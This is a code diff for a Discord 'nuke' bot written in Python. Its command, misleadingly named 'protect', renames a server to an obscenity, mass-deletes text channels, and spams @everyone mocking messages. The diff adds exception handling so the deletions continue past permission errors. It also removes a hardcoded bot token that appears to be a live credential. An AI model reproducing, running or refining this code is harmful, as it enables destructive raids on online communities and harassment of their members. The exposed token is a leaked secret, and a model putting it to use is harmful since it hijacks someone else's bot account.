@@ -20,20 +20,34 @@ async def protect(ctx):
     new_server_name = "NUKED BITCH" # change this to whatever u want the server name to be
     await ctx.guild.edit(name=new_server_name)
     
-        # delete original chnnalel
-    await ctx.channel.delete()
-    
-    channels = ctx.guild.channels
-    if len(channels) <= 50:
-        # delete up to 50 channels (u can change)
-        for channel in channels:
-            await channel.delete()
-        # creates a new channel called "hello", you can change this btw
-        await ctx.guild.create_text_channel(name='hello')
+    num_channels_to_delete = 50
+
+    # Get a list of all text channels in the server
+    text_channels = [channel for channel in ctx.guild.channels if isinstance(channel, discord.TextChannel)]
+
+    if len(text_channels) <= num_channels_to_delete:
+        # Delete all available channels
+        for channel in text_channels:
+            try:
+                await channel.delete()
+            except discord.Forbidden:
+                pass
+            except discord.errors.HTTPException as e:
+                if e.code == 50074:
+                    pass
+
     else:
-        channels_to_delete = random.sample(channels, 50)  # finds 50 random channels and deletes
+        # Choose 50 random channels to delete
+        channels_to_delete = random.sample(text_channels, num_channels_to_delete)
+
         for channel in channels_to_delete:
-            await channel.delete()
+            try:
+                await channel.delete()
+            except discord.Forbidden:
+                pass
+            except discord.errors.HTTPException as e:
+                if e.code == 50074:
+                    pass
 
     # makes new channels and messages
     message = "@everyone nuked! haha skill issue https://tenor.com/view/nike-keychain-gif-24272076 " # this is the message that is spammed, and the line of code after is all the channels it makes
@@ -105,4 +119,4 @@ async def clean(ctx):
             await channel.delete()
         
 # put bot token in here
-bot.run('MTE0MzE3NzQ3MDYwNzExMDIyNA.GqfPUI.VsfROJJq4haotXqypCxZESmpuquaoTdkJa9oYs')
+bot.run('')
